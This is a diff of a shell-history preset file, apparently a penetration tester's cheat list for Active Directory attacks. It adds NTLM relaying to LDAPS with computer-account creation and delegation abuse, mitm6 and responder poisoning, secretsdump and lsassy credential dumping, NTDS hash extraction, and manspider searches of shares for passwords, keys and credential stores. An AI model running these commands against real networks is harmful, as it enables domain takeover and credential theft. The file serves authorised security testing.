@@ -7,12 +7,13 @@
 : 1773000000:0;rce -d dokalibz.local
 : 1773000000:0;oke -f 4 'Dokalibz :)'
 : 1773000000:0;oke '<'
+: 1773000000:0;awk -F':' '{print $4}' ./ntlm-ntds.dit | sort | uniq > hash_passwords.txt
 : 1773000000:0;sudo timedatectl set-ntp off
 : 1773000000:0;sudo rdate -n 10.20.30.40
-: 1773000000:0;nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
-: 1773000000:0;sudo nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
 : 1773000000:0;nmap -oN 'nmap.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS -sV -sC -A --open -p 1337 'dokalibz.local'
 : 1773000000:0;sudo nmap -oN 'nmap.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS -sV -sC -A --open -p 1337 'dokalibz.local'
+: 1773000000:0;nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
+: 1773000000:0;sudo nmap -oG 'open-ports.txt' --min-rate 7000 --max-rate 7000 --max-retries 1 -sS --open -p- 'dokalibz.local'
 : 1773000000:0;echo -n 'dokalibz.local' | dnsx -silent -recon -r '9.9.9.9'
 : 1773000000:0;psudohash.py -w doka,doka-libz -cpa -cpb -y 2024,2025,2026
 : 1773000000:0;psudohash.py -w doka,libz -i --sep '-' -c -cpa -cpb -y 2023,2024,2025
@@ -47,7 +48,12 @@
 : 1773000000:0;responder -I eth0
 : 1773000000:0;sudo mitm6 -i eth0 -d "$dom"
 : 1773000000:0;mitm6 -i eth0 -d "$dom"
-: 1773000000:0;ntlmrelayx.py -tf smb-relays.txt --dump-hashes -smb2support -socks --keep-relaying
+: 1773000000:0;sudo ntlmrelayx.py -tf smb-relays.txt -smb2support -socks --keep-relaying
+: 1773000000:0;ntlmrelayx.py -tf smb-relays.txt -smb2support -socks --keep-relaying
+: 1773000000:0;ntlmrelayx.py -t "ldaps://$dc" -wh "wpad.$dom" --add-computer 'babbz$' --delegate-access
+: 1773000000:0;sudo ntlmrelayx.py -t "ldaps://$dc" -wh "wpad.$dom" --add-computer 'babbz$' --delegate-access
+: 1773000000:0;proxychains4 smbclient.py "TARGET@IP' -no-pass
+: 1773000000:0;proxychains4 secretsdump.py "TARGET@IP' -no-pass
 : 1773000000:0;smbclient.py "$dc" -k -no-pass
 : 1773000000:0;secretsdump.py -hashes ':HASH' "$dom/$user@10.20.30.40"
 : 1773000000:0;addspn.py -u "$dom\$user" -p "$pass" --target-type samname -t 'TARGET' -s 'SPN' "$dc"
@@ -62,10 +68,18 @@
 : 1773000000:0;secretsdump.py "$dom/$user:$pass@10.20.30.40"
 : 1773000000:0;smbclient.py "$dom/$user:$pass@10.20.30.40"
 : 1773000000:0;lsassy 10.20.30.40 -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" delegations
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" memberships doka
 : 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" search '(name=doka)' 'memberOf'
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" membersof Administrators
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" gpo
+: 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" ou
 : 1773000000:0;gpoParser display -c GPOs.py
 : 1773000000:0;gpoParser remote -s "$dc" -d "$dom" -u "$user" -p "$pass" -o GPOs.json
-: 1773000000:0;manspider -e bat com vbs txt sh ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config yml yaml vmdk vhd vdi dit ppk rsa ssh rsa p12 pkcs12 crt cer csr jks keystore keys der kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb keytab ccache kirbi -o -f passw passe secret key cle mdp user admin account login cred sql env hist profil id_rsa id_dsa id_ed25519 -d "$dom" -u "$user" -p "$pass" 10.20.30.40
+: 1773000000:0;gpoParser query -c GPOs.json -C srv01
+: 1773000000:0;gpoParser enrich -c GPOs.json
+: 1773000000:0;manspider -c passw passe mdp 'root@' admin -e txt csv yml yaml xml toml cfg md json py php js c sql env docx pdf pptx xlsx bat com vbs txt sh ps1 psd1 psm1 -d "$dom" -u "$user" -p "$pass" 10.20.30.40
+: 1773000000:0;manspider -e keystore keys kdbx kdb keytab ccache kirbi -o -f passw passe secret mdp admin account login index -d "$dom" -u "$user" -p "$pass" 10.20.30.40
 : 1773000000:0;nxc smb 10.20.30.0/24 --generate-hosts-file ./hosts.txt
 : 1773000000:0;nxc smb 10.20.30.0/24 -d "$dom" -u "$user" -p "$pass"
 : 1773000000:0;python3 -m venv .venv
@@ -90,8 +104,8 @@
 : 1773000000:0;sudo nano /etc/resolv.conf
 : 1773000000:0;sudo nano /usr/lib/ssl/openssl.cnf
 : 1773000000:0;nano /usr/lib/ssl/openssl.cnf
-: 1773000000:0;export net="10.20.30.0/24"
-: 1773000000:0;export dc="10.20.30.40"
-: 1773000000:0;export dom="domain"
-: 1773000000:0;export user="username" pass="password"
-: 1773000000:0;export dom="domain" user="username" pass="password"
+: 1773000000:0;export net='10.20.30.0/24'
+: 1773000000:0;export dc='10.20.30.40'
+: 1773000000:0;export dom='domain'
+: 1773000000:0;export user='username' pass='password'
+: 1773000000:0;export dom='domain' user='username' pass='password'
